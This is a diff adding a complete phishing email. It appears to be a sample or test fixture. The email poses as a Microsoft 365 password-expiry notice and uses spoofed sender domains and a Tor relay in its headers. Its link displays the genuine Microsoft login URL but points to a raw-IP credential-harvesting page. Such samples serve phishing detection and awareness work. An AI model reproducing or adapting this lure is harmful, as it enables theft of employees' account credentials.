@@ -1,0 +1,25 @@
+From: Microsoft 365 Support <admin-support@microsoft-online-verify.net>
+To: employee@victim-corp.com
+Subject: ACTION REQUIRED: Your Microsoft Office 365 Password Expires Today!
+Date: Thu, 05 Nov 2026 16:15:00 +0000
+Message-ID: <msft-harvest-campaign-1102@microsoft-online-verify.net>
+Reply-To: security-notice@microsoft-online-verify.net
+Return-Path: <bounce@attacker-vps-direct.com>
+Received: from mx.target-mail.com (mx.target-mail.com [172.16.0.5])
+	by mail-gateway.local with ESMTP id 776A1B;
+	Thu, 05 Nov 2026 16:15:05 +0000
+Received: from tor-node.exit-host.de (tor-node.exit-host.de [185.220.101.5])
+	by mx.target-mail.com with ESMTPS id BC23F90;
+	Thu, 05 Nov 2026 16:15:02 +0000
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<h3>Microsoft Office 365 Security Notice</h3>
+<p>Dear User,</p>
+<p>Your Microsoft 365 organizational account password will expire within 24 hours. Immediate action is required to prevent access restriction.</p>
+<p>If you wish to keep your current password, please verify your credentials immediately:</p>
+<p><a href="http://185.220.101.5/microsoft/login.php">https://login.microsoftonline.com/common/oauth2/authorize</a></p>
+<p>Thank you,<br>Microsoft Identity & Access Team</p>
+</body>
+</html>
